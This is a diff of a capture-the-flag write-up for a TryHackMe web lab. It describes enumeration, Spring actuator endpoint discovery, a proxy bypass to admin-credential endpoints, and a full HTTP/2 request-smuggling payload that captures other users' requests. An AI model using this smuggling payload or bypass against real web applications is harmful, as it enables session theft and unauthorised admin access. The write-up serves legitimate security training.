@@ -10,6 +10,7 @@ tags: Web App Security
 ## URL — https://tryhackme.com/room/elbandito
 
 ## VIDEO
+- This is write up simply provides steps to exploit. For explanation, thought process, why I did what I did
 
 ## ENUMERATION
 1. Run nmap scan against the target `nmap -sV -A -p- bandito.thm`
@@ -67,18 +68,58 @@ Host: bandito.thm:8080
 
 6. Disable the "Update Content-Length" feature on Burp Suites.
 7. Send the request. We should be able to view `burn.html`
-8. Try to burn a token, we get error. Also, from here we learn the application is using Java Spring framework.
-9. Google Spring framework and we get a list of potential endpoints to exploit: https://docs.spring.io/spring-boot/reference/actuator/endpoints.html
-10. Run `dirb` against port 8081 using this wordlist
-11. With new discovery, go to **/mappings** endpoint. We find two interesting endpoints: **/admin-creds** & **/admin-flag**
-12. Viewing these two payloads in regular browser will yield 403 error, meaning the proxy restricts the access.
-13. Use the payload from step #5 to bypass the restriction
+   
+9. Try to burn a token, we get error. Also, from here we learn the application is using Java Spring framework.
+10. Google Spring framework and we get a list of potential endpoints to exploit: https://docs.spring.io/spring-boot/reference/actuator/endpoints.html
+11. Run `dirb` against port 8081 using this wordlist
+12. With new discovery, go to **/mappings** endpoint. We find two interesting endpoints: **/admin-creds** & **/admin-flag**
+13. Viewing these two payloads in regular browser will yield 403 error, meaning the proxy restricts the access.
+14. Use the payload from step #5 to bypass the restriction
     - **admin-flag**
     - **admin-creds**
    
 ## Flag 2
 1. Log in with the credentials from the above step #13
 2. Use Burp to intercept the request to homepage on port 80 & send it to **Repeater**
-3. 
+3. Paste the following payload
 
+```
+POST / HTTP/2
+Host: bandito.thm:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.abXopA.mjOLyYz9xwXZNnSERtSxegZ1gbw
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://bandito.thm:80/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Content-Length: 0
+
+POST /send_message HTTP/1.1
+Host: bandito.thm:80
+Content-Length: 900
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.abXopA.mjOLyYz9xwXZNnSERtSxegZ1gbw
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://bandito.thm:80/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Content-Type: application/x-www-form-urlencoded
+Te: trailers
+
+data=c: 
+```
+4. Make a request go `/getMessages` and we should see the smuggled content, which contains the flag.
 
